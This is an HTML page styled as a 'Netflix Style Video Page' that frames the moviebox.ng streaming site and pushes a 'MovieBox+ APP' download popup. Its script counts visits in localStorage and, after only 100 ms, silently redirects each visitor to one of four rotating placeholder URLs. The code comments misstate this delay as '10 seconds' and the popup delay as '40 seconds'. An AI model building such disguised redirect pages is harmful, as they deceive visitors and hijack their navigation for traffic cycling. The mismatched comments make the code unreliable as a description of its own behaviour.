<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix Style Video Page</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        body {
            background: #000;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .frame-container {
            width: 100vw;
            height: 100vh;
            display: block;
        }
        iframe {
            width: 100%;
            height: 100%;
            border: none;
        }

        /* Netflix Style Bottom Navigation */
        footer {
            display: flex;
            justify-content: space-around;
            align-items: center;
            padding: 12px 0;
            border-radius: 10px;
            background-color: rgba(0, 0, 0, 0.8);
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            z-index: 100;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
        }
        footer .nav-icon {
            flex: 1;
            text-align: center;
            color: #b3b3b3;
            transition: all 0.3s ease-in-out;
            cursor: pointer;
            font-size: 10px;
        }
        footer .nav-icon i {
            font-size: 24px;
            margin-bottom: 5px;
            transition: 0.3s;
        }
        footer .nav-icon.active, 
        footer .nav-icon:hover {
            color: #00b300;
        }
        footer .nav-icon.active i, 
        footer .nav-icon:hover i {
            transform: scale(1.2);
        }
        .notification-bar {
            position: fixed;
            bottom: 80px;
            left: 50%;
            transform: translateX(-50%);
            width: 90%;
            max-width: 400px;
            background: linear-gradient(to right, #004d00, #00b300);
            color: white;
            padding: 10px;
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            opacity: 0;
            transition: opacity 0.5s ease-in-out;
            z-index: 1000;
        }
        .notification-bar img {
            width: 40px;
            height: 40px;
            border-radius: 8px;
            margin-right: 10px;
        }
        .notification-text {
            flex: 1;
            font-size: 11px;
            text-align: left;
        }
        .notification-button {
            background: #ccff00;
            color: #000;
            padding: 5px 15px;
            border-radius: 20px;
            font-weight: bold;
            cursor: pointer;
            border: none;
        }
        .close-button {
            background: none;
            border: none;
            color: white;
            font-size: 18px;
            cursor: pointer;
            margin-left: 10px;
        }
    </style>
</head>
<body>
    
    <div class="notification-bar" id="notification-bar">
        <img src="https://h5-static.aoneroom.com/oneroomStatic/public/_nuxt/web-logo.apJjVir2.svg" alt="App Logo">
        <div class="notification-text">To view more content, download the MovieBox+ APP.</div>
        <button class="notification-button" onclick="window.open('https://example.com', '_blank')">OPEN</button>
        <button class="close-button" onclick="closeNotification()">✖</button>
    </div>

    <div class="frame-container">
        <iframe id="video-frame" src="https://moviebox.ng/?utm_source=h5seo_www.google.com" allowfullscreen></iframe>
    </div>

    <footer>
        <div class="nav-icon active" data-video="https://moviebox.ng/?utm_source=h5seo_www.google.com">
            <i class="fas fa-home"></i><br>Home
        </div>
        <div class="nav-icon" data-video="https://moviebox.ng/web/class-list?platform=Netflix">
            <i class="fas fa-compass"></i><br>Explore 
        </div>
        <div class="nav-icon" data-video="https://moviebox.ng/web/ranking-list?id=997144265920760504&utm_source=h5seo_www.google.com">
            <i class="fas fa-play-circle"></i><br>For You 
        </div>
        <div class="nav-icon" data-video="https://moviebox.ng/web/class-month?platform=Netflix&month=202501">
            <i class="fas fa-fire"></i><br>New & Hot
        </div>
    </footer>

    <script>
        const videoFrame = document.getElementById("video-frame");

        document.querySelectorAll(".nav-icon").forEach(icon => {
            icon.addEventListener("click", function() {
                document.querySelectorAll(".nav-icon").forEach(i => i.classList.remove("active"));
                this.classList.add("active");

                // Change video source based on the selected section
                videoFrame.src = this.getAttribute("data-video");
            });
        });

        // Array of links

const links = [

    "https://www.link1.com",

    "https://www.link2.com",

    "https://www.link3.com",

    "https://www.link4.com"

];


// Retrieve the visit count from localStorage (default to 0 if not set)

let visitCount = parseInt(localStorage.getItem("visitCount") || "0", 10);


// Get the current link based on the visit count

const currentLink = links[visitCount % links.length]; // Loop through links array


// Increment the visit count and save it back to localStorage

localStorage.setItem("visitCount", visitCount + 1);


// Redirect to the current link after 10 seconds

setTimeout(() => {

    window.location.href = currentLink;

}, 100); // 10 seconds in milliseconds
        
        setTimeout(() => {
            document.getElementById('notification-bar').style.opacity = '1';
        }, 400); // Show after 40 seconds

        function closeNotification() {
            document.getElementById('notification-bar').style.opacity = '0';
        }
    </script>
</body>
</html>
